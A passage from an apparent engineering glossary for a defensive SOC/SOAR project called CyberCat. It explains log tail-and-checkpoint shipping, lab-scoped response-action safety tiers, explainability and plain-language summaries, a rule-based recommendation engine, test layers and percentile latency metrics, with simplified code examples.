**Related entries:** [sshd auth events](#sshd-auth-events) · [Tail-and-checkpoint pattern](#tail-and-checkpoint-pattern) · [Docker Compose profiles](#docker-compose-profiles)

---

#### Tail-and-checkpoint pattern
*Introduced: Phase 16 · Category: Project-specific patterns*

**Intuition:** Tail-and-checkpoint is "follow a log file from where I left off, remember my position so a restart doesn't replay events I already shipped." It's `tail -f` with a memory of where you stopped reading, plus the discipline to handle log rotation and truncation.

**Precise:** The pattern: open the file, seek to the offset stored in a checkpoint file (`/var/lib/cct-agent/checkpoint.json` for sshd, plus per-source variants), read line-by-line, ship each line, periodically flush the new offset to disk (atomically — write to `.tmp`, rename). On startup, detect rotation (file inode changed) or truncation (`size < offset`) and reset to offset 0. Missing files are tolerated (gated by `path.exists()` + env var so the agent degrades gracefully when audit/conntrack subsystems aren't present).

**How it works (under the hood):**

**The checkpoint file** is a tiny JSON document the source writes periodically:

```json
{
  "path": "/var/log/auth.log",
  "inode": 12345,
  "offset": 8192,
  "updated_at": "2026-04-28T10:00:00Z"
}
```

`inode` and `offset` together pin "where I left off in *this specific file*." On startup the source reads the checkpoint, opens the path, compares inode and size, and decides whether to resume, restart, or rotate.

**The startup decision tree:**

```python
# agent/cct_agent/sources/sshd_source.py (simplified)
def determine_start_position(path: str, checkpoint: dict | None) -> int:
    stat = os.stat(path)
    if checkpoint is None:
        return 0                              # first run — start from beginning
    if stat.st_ino != checkpoint["inode"]:
        # File was rotated — old log moved to auth.log.1, fresh auth.log created
        return 0
    if stat.st_size < checkpoint["offset"]:
        # File was truncated (log was wiped) — start over
        return 0
    return checkpoint["offset"]               # normal resume
```

Three scenarios, all handled:

1. **Cold start** — no checkpoint → start at offset 0 (read the whole file). On a busy log this could mean replaying months of history; CyberCat's first-run sets a "skip to end" flag to avoid that.
2. **Rotation** — log rotation moves `auth.log` to `auth.log.1` and creates a new empty `auth.log`. New file = new inode. The check `st_ino != checkpoint.inode` catches this; restart at offset 0 of the new file.
3. **Truncation** — `> auth.log` (or `truncate -s 0`) keeps the inode but resets the size. The check `st_size < checkpoint.offset` catches this; restart at offset 0.

**The tail loop:**

```python
async def tail_loop(path: str, parser: Callable, shipper: Shipper):
    checkpoint = load_checkpoint()
    offset = determine_start_position(path, checkpoint)
    inode = os.stat(path).st_ino

    with open(path, "r") as f:
        f.seek(offset)
        while True:
            line = f.readline()
            if line:
                event = parser(line)
                if event:
                    await shipper.put(event)
                offset = f.tell()
                # Periodic checkpoint write (every N lines or T seconds)
                if should_checkpoint():
                    save_checkpoint({"path": path, "inode": inode, "offset": offset})
            else:
                # EOF — wait for more data; periodically re-check for rotation
                await asyncio.sleep(0.1)
                if rotation_detected(path, inode):
                    # Reopen on the new file
                    f.close()
                    f = open(path, "r")
                    inode = os.stat(path).st_ino
                    offset = 0
```

`f.readline()` returns the empty string at EOF. The sleep + recheck loop is "tail -f" — wait briefly, try again, check whether the file we're reading was rotated out from under us.

**The atomic checkpoint write** prevents partial writes from corrupting the checkpoint:

```python
def save_checkpoint(state: dict) -> None:
    path = "/var/lib/cct-agent/checkpoint.json"
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(state, f)
        f.flush()
        os.fsync(f.fileno())            # force OS-level disk write
    os.rename(tmp, path)                # atomic on POSIX
```

`os.rename` is atomic at the filesystem level — either the new file is fully in place, or the old one is. A crash mid-write leaves the old checkpoint intact. Without this dance, a power-loss-during-write could leave a half-written checkpoint that fails to parse on restart, blocking the source.

**The shipper's bounded queue + drop-oldest:**

```python
# agent/cct_agent/shipper.py (simplified)
class Shipper:
    def __init__(self, max_queue: int = 10000):
        self._queue: asyncio.Queue = asyncio.Queue(maxsize=max_queue)

    async def put(self, event: dict) -> None:
        try:
            self._queue.put_nowait(event)
        except asyncio.QueueFull:
            # Drop oldest, insert newest — favors freshness over completeness
            try:
                self._queue.get_nowait()                # discard oldest
            except asyncio.QueueEmpty:
                pass
            self._queue.put_nowait(event)
```

If the backend is offline for an hour, the agent doesn't OOM (queue is bounded). When the backend comes back, the agent ships the most recent 10000 events — not the oldest, which would be stale. This is the "freshness over completeness" tradeoff that's right for telemetry but wrong for, say, billing events.

**Exponential backoff on the shipper's HTTP loop:**

```python
async def ship_loop():
    delay = 1.0
    while True:
        event = await self._queue.get()
        try:
            resp = await client.post("/v1/events/raw", json=event, ...)
            if 400 <= resp.status_code < 500:
                log.warning("dropping malformed event", extra={"status": resp.status_code})
                # Never retry 4xx — payload is bad, retrying won't help
                continue
            if resp.status_code >= 500:
                raise RuntimeError(f"5xx {resp.status_code}")
            delay = 1.0                              # success — reset backoff
        except (httpx.NetworkError, RuntimeError) as e:
            log.warning("ship failed; backing off", extra={"delay_s": delay})
            await asyncio.sleep(delay)
            await self._queue.put_nowait(event)      # requeue
            delay = min(delay * 2, 60)               # cap at 60s
```

Three rules: **never retry 4xx** (payload is wrong; retrying just spams the bad request), **always retry 5xx + network errors** (server's fault, will probably recover), **exponential backoff with cap** (back off fast when backend is down, recover fast when it returns).

**Why it exists:** Without checkpointing, a process restart replays the entire log (= duplicate events flood downstream). Without rotation handling, log rotation silently kills your follow loop (you keep reading the now-deleted file). Without truncation handling, a wiped log file makes you skip every future entry (your offset is past the new EOF). All three failure modes happen in production; the pattern handles all three.

**Where in CyberCat:** `agent/cct_agent/sources/sshd_source.py`, `auditd_source.py`, `conntrack_source.py`. Each has its own checkpoint file under `/var/lib/cct-agent/`. The triple-tail design (Phase 16.10) runs all three in parallel goroutine-equivalents (asyncio tasks) sharing one `Shipper` queue with bounded size + drop-oldest on overflow.

**Where else you'll see it:** Filebeat (the canonical reference), Fluent Bit's `tail` input, Vector's `file` source, Logstash's `file` input, Promtail. The pattern is universal in log shipping.

**Tradeoffs:** Drop-oldest on overflow trades freshness for survival — if downstream is offline for an hour, you'd rather have the most recent events than the oldest. The opposite (block on full queue) would make the agent OOM. The exponential-backoff on the shipper is the second half of the same survivability story: never retry 4xx (malformed payload — drop and continue), always backoff on 5xx and network errors.

**Related entries:** [Pluggable telemetry adapter pattern](#pluggable-telemetry-adapter-pattern) · [sshd auth events](#sshd-auth-events) · [auditd](#auditd-execve--syscall--eoe)

---

#### Action classification (auto-safe / suggest-only / reversible / disruptive)
*Introduced: Phase 5 · Category: Project-specific patterns*

**Intuition:** Every response action carries a safety classification: **auto-safe** runs without asking, **suggest-only** never executes (just records the recommendation), **reversible** runs but can be undone, **disruptive** runs and can't be undone. The classification governs what the system is allowed to do without an analyst in the loop.

**Precise:** `backend/app/response/policy.py` is a pure function `classify(kind: ActionKind) -> ClassificationDecision(classification, reason)`. Every action kind maps to exactly one of the four classifications. The executor (`backend/app/response/executor.py`) gates behavior: `propose_action` validates lab-scope; `execute_action` checks classification; `revert_action` returns 409 for `disruptive`. UI shows classification badges on every action so the analyst always sees the safety tier.

**How it works (under the hood):**

**The classification function** is a pure lookup — no side effects, no DB, no async:

```python
# backend/app/response/policy.py (simplified)
from dataclasses import dataclass
from enum import Enum

class Classification(str, Enum):
    auto_safe = "auto_safe"
    suggest_only = "suggest_only"
    reversible = "reversible"
    disruptive = "disruptive"

@dataclass(frozen=True)
class ClassificationDecision:
    classification: Classification
    reason: str

_MAP: dict[ActionKind, ClassificationDecision] = {
    ActionKind.tag_incident:        ClassificationDecision(Classification.auto_safe,
                                        "tag changes don't affect external systems"),
    ActionKind.elevate_severity:    ClassificationDecision(Classification.auto_safe,
                                        "severity is metadata; analyst can adjust"),
    ActionKind.request_evidence:    ClassificationDecision(Classification.suggest_only,
                                        "creates a checklist row; never executes externally"),
    ActionKind.flag_host_in_lab:    ClassificationDecision(Classification.reversible,
                                        "marker on LabAsset.notes; revert clears"),
    ActionKind.invalidate_lab_session: ClassificationDecision(Classification.reversible,
                                        "sets invalidated_at; revert clears"),
    ActionKind.block_observable:    ClassificationDecision(Classification.reversible,
                                        "BlockedObservable.active toggle; revert sets False"),
    ActionKind.quarantine_host_lab: ClassificationDecision(Classification.disruptive,
                                        "iptables rule (with WAZUH_AR_ENABLED); cannot reverse in-flight connections"),
    ActionKind.kill_process_lab:    ClassificationDecision(Classification.disruptive,
                                        "kill -9 (with WAZUH_AR_ENABLED); cannot un-kill"),
}

def classify(kind: ActionKind) -> ClassificationDecision:
    return _MAP[kind]
```

Pure lookup means easy to test (`test_policy.py` walks every ActionKind and asserts the expected tier), easy to audit (the table is the rule), and trivially fast (microsecond lookup, no DB).

**The executor's gating** wraps the lookup with state and authorization:

```python
# backend/app/response/executor.py (simplified)
async def propose_action(
    incident_id: UUID, kind: ActionKind, params: dict,
    actor_user_id: UUID, db: AsyncSession,
) -> Action:
    # Lab-scope check: target host must be a LabAsset
    target = params.get("host") or params.get("entity_id")
    if target and not await is_lab_target(target, db):
        raise HTTPException(400, "action target is not a lab asset")

    decision = classify(kind)
    action = Action(
        incident_id=incident_id,
        kind=kind,
        params=params,
        classification=decision.classification.value,
        status="proposed",
        actor_user_id=actor_user_id,
    )
    db.add(action)
    await db.commit()
    return action

async def execute_action(action: Action, db: AsyncSession) -> Action:
    decision = classify(action.kind)
    if decision.classification == Classification.suggest_only:
        # Suggest-only never executes — propose creates the EvidenceRequest, that's the whole story
        action.status = "noop"
        return action

    handler = HANDLERS[action.kind]
    result = await handler(action, db)
    action.status = result.status      # "ok" | "partial" | "error"
    db.add(ActionLog(action_id=action.id, ts=now(), result=result.detail))
    await db.commit()
    return action

async def revert_action(action: Action, db: AsyncSession) -> Action:
    decision = classify(action.kind)
    if decision.classification != Classification.reversible:
        raise HTTPException(409, f"{action.kind} is {decision.classification.value}; cannot be reverted")
    handler = HANDLERS[action.kind]
    await handler.revert(action, db)
    action.status = "reverted"
    await db.commit()
    return action
```

**The auto-action runner** uses the classification to decide what fires automatically:

```python
# backend/app/correlation/auto_actions.py (simplified)
async def maybe_run_auto_actions(incident, db, redis):
    # 1. Auto-execute the auto_safe actions for this incident kind
    for kind in default_auto_safe_actions_for(incident.kind):
        action = await propose_action(incident.id, kind, params={...}, actor_user_id=SYSTEM_USER, db=db)
        if classify(kind).classification == Classification.auto_safe:
            await execute_action(action, db)

    # 2. Auto-propose suggest_only request_evidence (never executes; just queues for analyst)
    if incident.kind == IncidentKind.identity_compromise:
        await propose_action(incident.id, ActionKind.request_evidence,
                            params={"checklist": ["recent_logins", "process_tree"]},
                            actor_user_id=SYSTEM_USER, db=db)
```

`auto_safe` ↔ "fire it now without asking." `suggest_only` ↔ "create the row but don't run anything; the analyst will see it." `reversible` and `disruptive` ↔ "wait for analyst approval; the UI requires confirmation."

**Why disruptive actions still write DB markers even with `WAZUH_AR_ENABLED=false`.** The handlers always update the database (`LabAsset.notes` gets the quarantine marker, an audit row appears, etc.). The Wazuh AR call is the *additional* effect, gated by the flag. With the flag off, you have a full audit trail of what *would have happened* — useful for testing, dry-runs, and demos that don't require a live Wazuh stack.

**The four-tier UX** in the frontend renders as colored badges:

| Class | Badge | Meaning to analyst |
|---|---|---|
| auto_safe | green | "already done by the system" |
| suggest_only | grey | "checklist; nothing executes" |
| reversible | blue | "I can run this and undo it" |
| disruptive | red | "running this is permanent — be sure" |

The classification is the analyst's first-look filter. They scan the action panel, see the colors, prioritize the red ones for careful review.

**Why it exists:** The CyberCat philosophy is "automation that doesn't surprise its operator." A SOAR that fires `kill -9` on a hunch loses analyst trust on the first false positive. The four-tier model lets the engine act fast on cheap, safe actions (`tag_incident`, `elevate_severity`) while leaving anything irreversible to a human decision. Phase 11's flag-gated Active Response (`WAZUH_AR_ENABLED=false` by default) extends this — the system *defaults* to DB-state-only behavior for disruptive kinds.

**Where in CyberCat:** `backend/app/response/policy.py` (the classification function), `backend/app/response/executor.py` (the gating). All 8 action kinds: `tag_incident` and `elevate_severity` (auto-safe), `request_evidence` (suggest-only), `flag_host_in_lab`, `invalidate_lab_session`, `block_observable` (reversible), `quarantine_host_lab`, `kill_process_lab` (disruptive). UI: `ActionClassificationBadge` component.

**Where else you'll see it:** AWS IAM permission boundaries are a richer version (allow + deny lists). Splunk SOAR (Phantom) calls them "playbook approval gates." Tines and Torq have similar gating models. The principle — "automation tier proportional to recoverability" — is a SOAR design pattern.

**Tradeoffs:** Three tiers would be simpler; five would be more nuanced. Four hits a sweet spot for CyberCat's scope. The line between "reversible" and "disruptive" is sometimes contextual — `kill_process_lab` is disruptive because killing a process can't restore its in-memory state, even if you can restart the binary.

**Related entries:** [Recommendation engine](#recommendation-engine-two-level-mapping) · [Wazuh Active Response](#wazuh-active-response) · [Explainability contract](#explainability-contract)

---

#### Explainability contract
*Introduced: Phase 1 (formalized in architecture §7) · Category: Project-specific patterns*

**Intuition:** The explainability contract is a hard rule that every incident must answer "why am I looking at this?" from the database alone — without re-running the engine, without consulting logs, without "trust me, the rule fired." If any question on the list becomes unanswerable, it's an architectural bug.

**Precise:** Eight questions every incident must answer from DB state: (1) which raw events contributed, (2) which detections fired, (3) which entities are involved and in what role, (4) which ATT&CK tactics/techniques apply, (5) why the correlator opened or grew this incident (`incidents.rationale` for technical, `incidents.summary` for plain-language since Phase 18), (6) what response actions ran or were proposed, (7) how status evolved, (8) what evidence was requested. Each is backed by a real table or column.

**Why it exists:** Without explainability, the analyst's only path to understanding is "read the rule code." That fails at scale, fails in audits, fails when you onboard new analysts. The contract makes the schema itself the explanation — querying any of the eight questions is a JOIN, not a code archaeology session. It's also the moral foundation of the whole "non-vibe-coded SOAR" pitch: the system tells you *why*, not just *what*.

**Where in CyberCat:** Architecture doc §7 codifies it. Tables: `incident_events`, `incident_detections`, `incident_entities`, `incident_attack`, `incident_transitions`, `notes`, `actions`, `action_logs`, `evidence_requests`, `blocked_observables`, plus `incidents.rationale` + `incidents.summary` columns. The frontend Incident detail page is essentially "render every answer to every question."

**Where else you'll see it:** Production-grade SIEM / SOAR products all have some version (Sentinel's investigation graph, Splunk SOAR's case timeline, Sumo's evidence linker). The legal / regulatory framing is "investigative reproducibility" — required in many compliance regimes (PCI DSS 10.x, SOC 2 CC7).

**Tradeoffs:** Storing more state means more schema. Migrations get larger. Junction tables proliferate (CyberCat has six). The discipline pays back the moment an analyst asks "why did this fire?" and you can answer with a SQL query instead of a 30-minute root-cause investigation.

**Related entries:** [Junction tables](#junction-tables-many-to-many) · [Plain-language summary layer](#plain-language-summary-layer)

---

#### Plain-language summary layer
*Introduced: Phase 18 · Category: Project-specific patterns*

**Intuition:** The plain-language layer is the discipline that the UI leads with English ("Two failed logins from a new IP, then a successful one — credentials may be compromised") instead of technical jargon ("`py.auth.anomalous_source_success` fired with confidence 0.62, T1078"). The technical detail is one click away behind a "Show technical detail" expander, not gone.

**Precise:** Three pieces. (1) `frontend/app/lib/labels.ts` — a centralized enum-to-friendly-label module that turns `IncidentKind.identity_compromise` into "Possible account compromise" and `ActionKind.block_observable` into "Block this address." (2) `PlainTerm` hybrid component — renders the friendly label by default, hovers/clicks reveal the technical name (the `<dfn>` HTML element with custom styling). (3) Backend `incidents.summary` column (Alembic 0008, nullable) populated by every correlator rule and the recommendations engine — the API exposes both `summary` (plain) and `rationale` (technical), and the UI leads with `summary`. A test (`test_summary_jargon.py`) asserts summaries don't leak rule_ids or ATT&CK technique codes.

**Why it exists:** The original UI was unreadable to anyone who didn't already know the domain — you had to know what `T1110.003` meant, what `endpoint_compromise_join` referred to, what `auto_safe` implied. The Phase 18 revision was a deliberate UX-as-product-quality move: explainability without a glossary tab open. ATT&CK IDs and rule IDs are still there, behind the expander, for the analysts who want them.

**Where in CyberCat:** `frontend/app/lib/labels.ts` (label module), `frontend/app/components/PlainTerm.tsx` (the hybrid component), `backend/app/db/models.py` (`Incident.summary`), `backend/app/correlation/rules/*.py` (each rule populates summary), `backend/app/response/recommendations.py` (recommendations carry summary too), Alembic `0008_add_incident_summary.py`, `backend/tests/test_summary_jargon.py`.

**Where else you'll see it:** GitHub's "what changed" UI vs the raw diff, Stripe Dashboard's "Charge succeeded — $42 to Acme Corp" vs the API response, Linear's status board vs the underlying state machine. Every product-grade tool with a technical underlay invests in this layer; most internal tools never do.

**Tradeoffs:** Two parallel descriptions per incident (summary + rationale) means two maintenance surfaces. The risk of drift is real — the `test_summary_jargon.py` guard exists because a developer could easily put a `T1110` reference in `summary` accidentally. Maintaining the labels module means keeping it in sync with backend enums (new `ActionKind`? add a label).

**Related entries:** [Explainability contract](#explainability-contract) · [Recommendation engine](#recommendation-engine-two-level-mapping) · [MITRE ATT&CK](#mitre-attck-tactics-techniques-subtechniques)

---

#### Recommendation engine (two-level mapping)
*Introduced: Phase 15 · Category: Project-specific patterns*

**Intuition:** The recommendation engine takes an incident and proposes "here are the four most relevant actions an analyst could take, ranked by priority." It's a small pure function over the incident's kind and ATT&CK tags — not an LLM, not a model, just two lookup tables and a sort.

**Precise:** Pure function `recommend_for_incident(incident) -> list[RecommendedAction]` in `backend/app/response/recommendations.py`. **Level 1** maps `IncidentKind` to a base candidate list (`identity_compromise` → `block_observable`, `invalidate_lab_session`, `flag_host_in_lab`, `request_evidence`). **Level 2** maps ATT&CK technique prefix to a priority boost (`T1110` → +20 to `block_observable`; `T1078` → +20 to `invalidate_lab_session`; `T1059` → +10 to `quarantine_host_lab`; `T1021` → +20 to `quarantine_host_lab`; `T1071`/`T1571` → +20 to `block_observable`). Match is `technique.startswith(prefix)` so subtechniques inherit. Already-executed-and-not-reverted actions are filtered out; candidates whose required entity is missing are dropped.

**How it works (under the hood):**

**The two-level mapping** lives as data, not code:

```python
# backend/app/response/recommendations.py (simplified)

# Level 1: incident kind → base candidates with default priority
LEVEL_1: dict[IncidentKind, list[tuple[ActionKind, int]]] = {
    IncidentKind.identity_compromise: [
        (ActionKind.block_observable, 50),
        (ActionKind.invalidate_lab_session, 40),
        (ActionKind.flag_host_in_lab, 30),
        (ActionKind.request_evidence, 20),
    ],
    IncidentKind.endpoint_compromise: [
        (ActionKind.quarantine_host_lab, 50),
        (ActionKind.block_observable, 40),
        (ActionKind.flag_host_in_lab, 30),
        (ActionKind.request_evidence, 20),
    ],
    IncidentKind.identity_endpoint_chain: [
        # union of the above two
        (ActionKind.quarantine_host_lab, 60),
        (ActionKind.block_observable, 55),
        (ActionKind.invalidate_lab_session, 45),
        (ActionKind.flag_host_in_lab, 30),
        (ActionKind.request_evidence, 20),
    ],
    IncidentKind.unknown: [
        (ActionKind.request_evidence, 50),
    ],
}

# Level 2: ATT&CK technique prefix → priority boost on a specific action
LEVEL_2: list[tuple[str, ActionKind, int]] = [
    ("T1110",  ActionKind.block_observable,        20),  # Brute Force → block source
    ("T1078",  ActionKind.invalidate_lab_session,  20),  # Valid Accounts → end the session
    ("T1059",  ActionKind.quarantine_host_lab,     10),  # C&S Interpreter
    ("T1021",  ActionKind.quarantine_host_lab,     20),  # Lateral Movement
    ("T1071",  ActionKind.block_observable,        20),  # Application Layer Protocol (C2)
    ("T1571",  ActionKind.block_observable,        20),  # Non-Standard Port (C2)
]

# Excluded — never recommended automatically (analyst must trigger explicitly)
EXCLUDED: set[ActionKind] = {
    ActionKind.tag_incident,
    ActionKind.elevate_severity,
    ActionKind.kill_process_lab,
}
```

**The full computation** step-by-step:

```python
async def recommend_for_incident(incident: Incident, db: AsyncSession) -> list[RecommendedAction]:
    # Load entities + executed actions + ATT&CK techniques in two queries (no N+1)
    incident = (await db.execute(
        select(Incident).where(Incident.id == incident.id)
        .options(selectinload(Incident.entities), selectinload(Incident.actions), selectinload(Incident.attack))
    )).scalar_one()

    entities_by_role = bucket_by_role(incident.entities)   # {"user": Entity, "host": Entity, ...}
    executed_actions = active_actions(incident.actions)     # filter out reverted

    # 1. Start with Level 1 base candidates
    candidates = []
    for kind, base_priority in LEVEL_1.get(incident.kind, []):
        if kind in EXCLUDED: continue
        candidates.append({"kind": kind, "priority": base_priority})

    # 2. Apply Level 2 ATT&CK boosts
    for technique in incident.attack:
        for prefix, kind, boost in LEVEL_2:
            if technique.id.startswith(prefix):
                for c in candidates:
                    if c["kind"] == kind:
                        c["priority"] += boost

    # 3. For each candidate, build the executable action with required entities
    results = []
    for c in candidates:
        action_def = build_action_for(c["kind"], entities_by_role)
        if action_def is None:
            continue                                       # required entity missing — drop candidate
        if is_already_executed(c["kind"], action_def["params"], executed_actions):
            continue                                       # already done — drop
        results.append(RecommendedAction(
            kind=c["kind"],
            priority=c["priority"],
            params=action_def["params"],
            target=action_def["target"],
            rationale=action_def["rationale"],
            classification=classify(c["kind"]).classification,
            summary=plain_language_summary(c["kind"], entities_by_role),
        ))

    # 4. Sort by priority, take top 4
    results.sort(key=lambda r: r["priority"], reverse=True)
    return results[:4]
```

**Concrete example.** Incident kind `identity_endpoint_chain`, ATT&CK `T1110.003` + `T1059.001`:

1. Level 1 starts with: `[quarantine_host_lab=60, block_observable=55, invalidate_lab_session=45, flag_host_in_lab=30, request_evidence=20]`
2. Level 2 — `T1110.003` starts with `T1110` → `block_observable += 20` → 75. `T1059.001` starts with `T1059` → `quarantine_host_lab += 10` → 70.
3. Final priorities: `block_observable=75, quarantine_host_lab=70, invalidate_lab_session=45, flag_host_in_lab=30`. Top 4 surfaced; `request_evidence=20` falls off the cut.

**Why "filter unexecutable candidates."** A `block_observable` recommendation needs an observable to block (a specific IP, domain, or hash). If the incident has no `observable`-role entity, the candidate is unexecutable and gets dropped. Same for `invalidate_lab_session` (needs a session) and `quarantine_host_lab` (needs a host). The recommender never returns a candidate the analyst couldn't actually run.

**Why "filter already-executed."** If the analyst has already executed `block_observable` on `192.0.2.10`, the system shouldn't suggest it again. The check is on `(kind, params)` — two block actions on different IPs are still distinct candidates, but the same block on the same IP is redundant.

**The frontend's "Use this" button** (`RecommendedActionsPanel`) opens `ProposeActionModal` with `prefill={kind, form}` — the recommended kind and pre-populated form fields. The analyst can review, edit, then confirm. Click-and-go for the obvious moves; opt-in friction for the high-impact ones.

**Why it exists:** Forcing the analyst to remember "what should I do for an identity_compromise with T1110.003?" every time is friction. The engine surfaces the obvious moves with one click, freeing the analyst to think about the non-obvious ones. Two-level matching gives both per-incident-kind defaults *and* technique-aware specificity without the combinatorial explosion of "incident_kind × technique" rules.

**Where in CyberCat:** `backend/app/response/recommendations.py`. Endpoint `GET /v1/incidents/{id}/recommended-actions`. Frontend: `RecommendedActionsPanel` renders above `ActionsPanel` with a "Use this" button that opens `ProposeActionModal` pre-populated. ADR-0010 documents the design.

**Where else you'll see it:** Jira's "suggested next status," Linear's "suggested project," Gmail's smart reply chips. The pattern of "context-aware ranked suggestions in the UI without ML" is everywhere because it's cheap, predictable, debuggable, and gets ~80% of the value of the ML version.

**Tradeoffs:** Static maps means analyst wisdom needs to be encoded by hand — there's no learning loop. The mapping is a maintenance surface; new techniques in ATT&CK v15 won't auto-affect ranking. Phase 22+23 (LotL + UEBA-lite) will eventually want statistical signals to feed in, but the recommendation engine will likely stay rule-based — the philosophy is "no ML in detection contexts" (see `docs/roadmap-discussion-2026-04-30.md`).

**Related entries:** [Action classification](#action-classification-auto-safe--suggest-only--reversible--disruptive) · [MITRE ATT&CK](#mitre-attck-tactics-techniques-subtechniques) · [Plain-language summary layer](#plain-language-summary-layer)

---

### Verification

#### Smoke tests vs unit tests vs integration tests
*Introduced: Phase 1 · Category: Verification*

**Intuition:** Three layers of test, each catching a different class of failure. **Unit tests** check one function in isolation (does `classify(kind)` return the right tier?). **Integration tests** check that several components cooperate (does `POST /v1/events/raw` end up writing both `events` and `event_entities`?). **Smoke tests** check that the actual deployed stack works end-to-end (run `start.sh`, fire a real curl, check the response, check the DB).

**Precise:** Unit tests run in milliseconds, mock or skip external deps, and pin behavior of pure functions. Integration tests run in seconds, use a real DB / Redis, and pin behavior of the API surface (CyberCat uses pytest with a Postgres test DB and per-test transaction rollback). Smoke tests run in minutes, use the real Docker Compose stack, and are bash scripts (`labs/smoke_test_phase*.sh`) that exercise the full ingest → detect → correlate → respond → display flow over HTTP. The three layers form a pyramid: many fast unit tests at the base, fewer integration tests, fewest slow smoke tests.

**How it works (under the hood):**

**The three layers compared:**

| Property | Unit | Integration | Smoke |
|---|---|---|---|
| Speed per test | ~1 ms | ~50 ms | ~1 s |
| Number in suite | hundreds | tens | dozens |
| Real DB? | No (mocked) | Yes (test DB, rollback per test) | Yes (the actual stack) |
| Real network? | No | Loopback only | Real HTTP through containers |
| Catches wiring bugs? | No | Some | Yes |
| Catches logic bugs? | Yes (cheaply) | Yes | Yes (expensively) |
| Runs on PR? | Always | Always | When relevant files change |
| Run frequency | Every commit | Every commit | Nightly + selective |

**Unit test example.** Pure-function test of the response-policy classifier:

```python
# backend/tests/response/test_policy.py
def test_kill_process_lab_is_disruptive():
    decision = classify(ActionKind.kill_process_lab)
    assert decision.classification == Classification.disruptive

def test_tag_incident_is_auto_safe():
    decision = classify(ActionKind.tag_incident)
    assert decision.classification == Classification.auto_safe
```

No DB, no Redis, no FastAPI. Imports the function, calls it, checks the return. Runs in milliseconds.

**Integration test example.** Real DB, real router, mocked external services:

```python
# backend/tests/api/test_incidents.py
async def test_transition_writes_audit_row(client, db_session, seed_user_analyst, seed_incident):
    response = await client.post(
        f"/v1/incidents/{seed_incident.id}/transitions",
        json={"new_status": "investigating", "reason": "looking into it"},
    )
    assert response.status_code == 200

    # Verify the audit row was written
    transitions = (await db_session.execute(
        select(IncidentTransition).where(IncidentTransition.incident_id == seed_incident.id)
    )).scalars().all()
    assert len(transitions) == 1
    assert transitions[0].actor_user_id == seed_user_analyst.id
```

The `client` fixture is a FastAPI `TestClient` running the real app against the test DB. The transaction-per-test fixture rolls back at the end so the next test starts clean.

**Smoke test example.** Real stack via docker compose:

```bash
#!/usr/bin/env bash
# labs/smoke_test_phase16.sh (simplified)
set -euo pipefail

API="http://localhost:8080"

# Bring stack up (idempotent)
bash start.sh

# Wait for backend to be ready
for i in $(seq 1 30); do
    if curl -sf "$API/health" > /dev/null; then break; fi
    sleep 1
done

# Inject a synthetic auth.failed event via the agent's POST endpoint
TOKEN=$(cat infra/secrets/CCT_AGENT_TOKEN)
curl -sf -X POST "$API/v1/events/raw" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    --data '{"kind":"auth.failed","ts":"2026-04-28T10:00:00Z","entities":{"user":"smoke-test-user","src_ip":"10.0.0.99"}}'

# Repeat 3 more times to cross the burst threshold
for i in 1 2 3; do
    curl -sf -X POST "$API/v1/events/raw" \
        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
        --data '{"kind":"auth.failed",...}'
done

# Verify the detection fired
DETECTIONS=$(curl -sf "$API/v1/detections?rule_id=py.auth.failed_burst")
COUNT=$(echo "$DETECTIONS" | python -c "import sys,json; print(len(json.load(sys.stdin)['items']))")
test "$COUNT" -ge 1 || { echo "FAIL: expected detection not present"; exit 1; }

echo "PASS"
```

The smoke runs end-to-end through the real stack: HTTP → FastAPI → Postgres → detection engine → Redis → DB write → query response. Anything broken anywhere in that chain causes the test to fail with a recognizable error.

**The pyramid math.** A test suite that's 95% unit + 4% integration + 1% smoke can run in under a minute on every commit but still cover everything that matters. Inverting the pyramid (mostly smoke) means slow feedback, frequent CI flakes, and developers learning to ignore failures.

**The flake-control discipline.** Smoke tests are inherently flakier (more moving parts, timing dependencies, container startup races). Two specific defenses CyberCat uses:

- `pytest -p no:randomly` on the merge gate (Phase 19 PR #6) — pytest-randomly's seed-shuffle was causing the same commit to pass on push and fail on PR. Pinning order eliminated the seed flake.
- `bash start.sh` instead of bare `docker compose up` so the agent profile + token bootstrap always run identically.

**Why it exists:** Each layer catches things the others miss. Unit tests don't catch wiring bugs (everything's mocked). Integration tests don't catch deployment issues (the test DB isn't quite the production stack). Smoke tests don't catch logic bugs efficiently (rerunning the entire stack to test one branch is wasteful). The pyramid gives fast feedback for most changes + a real-deployment safety net for the things only the full stack can prove.

**Where in CyberCat:** Unit + integration: `backend/tests/` (236 tests as of Phase 19), `agent/tests/` (122 tests). Smoke: `labs/smoke_test_phase*.sh` (per phase, ~6 scripts active in current matrix). CI runs unit + integration on every push/PR; smoke runs nightly on `main` plus on PRs that touch the smoke surface (`smoke.yml`).

**Where else you'll see it:** Universal pattern — Mike Cohn's "test pyramid" (2009) is the canonical reference. Every mature codebase has the three layers, sometimes with extra ones (contract tests, snapshot tests, end-to-end UI tests with Playwright/Cypress, chaos tests). The exact ratios are religious.

**Tradeoffs:** Smoke tests are flaky by nature (the more moving parts, the more failure modes). Pinning their ordering with `pytest -p no:randomly` (Phase 19's PR #6 fix) defends against random-seed flakes but doesn't help with timing-sensitive race conditions. Smoke tests at PR-time are slow but cheap; running them only nightly is fast but lets bad changes hit `main`. CyberCat's compromise: PR triggers when the *workflow itself* changes (so it self-validates), nightly otherwise.

**Related entries:** [pytest fixtures](#pytest-fixtures) · [Detection-as-Code (DaC)](#detection-as-code-dac)

---

#### p50 / p95 / p99 percentiles
*Introduced: Phase 19 · Category: Verification*

**Intuition:** When measuring latency, the average lies. p50 (median) tells you "half the requests were faster than this." p95 tells you "5% of requests were slower than this — that's your tail." p99 tells you "the worst 1% of requests landed here — that's your nightmare." For UX, p95/p99 matter more than the mean.

**Precise:** Percentiles are order statistics — the value at the Nth percentile means N% of observations were at or below that value. Computing them requires either keeping all values (expensive) or an approximation algorithm (HDR Histogram, t-digest). CyberCat's load harness records every observation in a sorted list and computes exact percentiles after the run. Reported as p50/p95/p99 per metric (HTTP latency, DB query time, end-to-end ingest-to-correlation latency).

**How it works (under the hood):**

**The exact computation** for a fixed-size dataset:

```python
def percentile(values: list[float], p: float) -> float:
    sorted_vals = sorted(values)
    k = (len(sorted_vals) - 1) * (p / 100)
    f = int(k)                                    # floor
    c = min(f + 1, len(sorted_vals) - 1)          # ceiling, clamped
    if f == c:
        return sorted_vals[f]
    # Linear interpolation between adjacent samples
    return sorted_vals[f] + (sorted_vals[c] - sorted_vals[f]) * (k - f)

